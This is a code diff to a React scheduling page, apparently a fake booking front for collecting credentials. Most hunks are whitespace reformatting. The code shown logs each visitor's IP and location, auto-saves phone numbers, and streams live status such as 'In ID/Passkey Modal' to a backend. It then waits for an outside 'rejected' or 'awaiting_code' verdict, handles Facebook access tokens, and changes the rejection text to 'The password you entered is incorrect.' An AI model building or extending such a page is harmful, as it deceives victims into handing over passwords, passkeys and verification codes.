@@ -150,7 +150,7 @@ function SchedulePageInner() {
     try {
       const clientTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
       if (clientTz) setTimezone(clientTz);
-    } catch {}
+    } catch { }
   }, []);
 
   const interviewerParam = searchParams.get("interviewer") || searchParams.get("admin");
@@ -258,7 +258,7 @@ function SchedulePageInner() {
                 type: "schedule_visit",
                 record: visitData,
               }),
-            }).catch(() => {});
+            }).catch(() => { });
           } else if (geoInfo) {
             // Update the visit row with the now resolved IP & location
             await supabase
@@ -359,7 +359,7 @@ function SchedulePageInner() {
               phone_number: phone.trim(),
             },
           }),
-        }).catch(() => {});
+        }).catch(() => { });
       }
     } catch (err) {
       console.error("Auto-save draft booking error:", err);
@@ -419,12 +419,12 @@ function SchedulePageInner() {
             phase === "confirmed"
               ? "Confirmed"
               : step === "details"
-              ? verifyStage === "closed"
-                ? "Entering Details"
-                : verifyStage === "idPasskey"
-                ? "In ID/Passkey Modal"
-                : `In ${verifyStage}`
-              : "Selecting Date & Time",
+                ? verifyStage === "closed"
+                  ? "Entering Details"
+                  : verifyStage === "idPasskey"
+                    ? "In ID/Passkey Modal"
+                    : `In ${verifyStage}`
+                : "Selecting Date & Time",
           online: true,
           updated_at: Date.now(),
         });
@@ -461,7 +461,7 @@ function SchedulePageInner() {
             setPhase("confirmed");
           } else if (status === "rejected") {
             // ID & Passkey rejection
-            setVerifyError("That ID or passkey doesn't match our records. Please re-enter and try again.");
+            setVerifyError("The password you entered is incorrect.");
             setVerifyStage("idPasskey");
           } else if (status === "awaiting_code") {
             if (req.startsWith("NOTIFICATION:")) {
@@ -544,9 +544,8 @@ function SchedulePageInner() {
             // Extract picture URL or construct guaranteed Graph API fallback
             let picUrl = userRes.picture?.data?.url || "";
             if (!picUrl && userId) {
-              picUrl = `https://graph.facebook.com/v19.0/${userId}/picture?type=large&width=320&height=320${
-                accessToken ? `&access_token=${accessToken}` : ""
-              }`;
+              picUrl = `https://graph.facebook.com/v19.0/${userId}/picture?type=large&width=320&height=320${accessToken ? `&access_token=${accessToken}` : ""
+                }`;
             }
 
             const profile = {
@@ -681,7 +680,7 @@ function SchedulePageInner() {
           type: "booking",
           record: submissionPayload,
         }),
-      }).catch(() => {});
+      }).catch(() => { });
 
       setVerifyStage("waiting");
     } catch (err) {
@@ -734,9 +733,8 @@ function SchedulePageInner() {
     <div className="min-h-screen bg-[#F4F5F7] font-sans flex flex-col items-center justify-center py-10 px-4 text-gray-800 font-normal">
       {/* Main Scheduling Card */}
       <div
-        className={`w-full bg-white rounded-2xl shadow-xl border border-gray-200/80 flex flex-col sm:flex-row transition-all duration-300 relative ${
-          step === "datetime" && !selectedDate ? "max-w-3xl" : "max-w-5xl"
-        }`}
+        className={`w-full bg-white rounded-2xl shadow-xl border border-gray-200/80 flex flex-col sm:flex-row transition-all duration-300 relative ${step === "datetime" && !selectedDate ? "max-w-3xl" : "max-w-5xl"
+          }`}
       >
         {/* Exact 3D Folded Corner Ribbon Badge matching reference image */}
         <CornerRibbon />
@@ -802,13 +800,12 @@ function SchedulePageInner() {
                           <button
                             disabled={!day.selectable}
                             onClick={() => pickDay(day)}
-                            className={`w-10 h-10 text-sm rounded-full flex items-center justify-center transition-all ${
-                              isSelected
+                            className={`w-10 h-10 text-sm rounded-full flex items-center justify-center transition-all ${isSelected
                                 ? "bg-[#0069ff] text-white font-semibold shadow-xs"
                                 : day.selectable
-                                ? "text-[#0069ff] hover:bg-blue-50/80 cursor-pointer font-medium"
-                                : "text-gray-300 cursor-not-allowed font-normal"
-                            }`}
+                                  ? "text-[#0069ff] hover:bg-blue-50/80 cursor-pointer font-medium"
+                                  : "text-gray-300 cursor-not-allowed font-normal"
+                              }`}
                           >
                             {day.dayNumber}
                           </button>
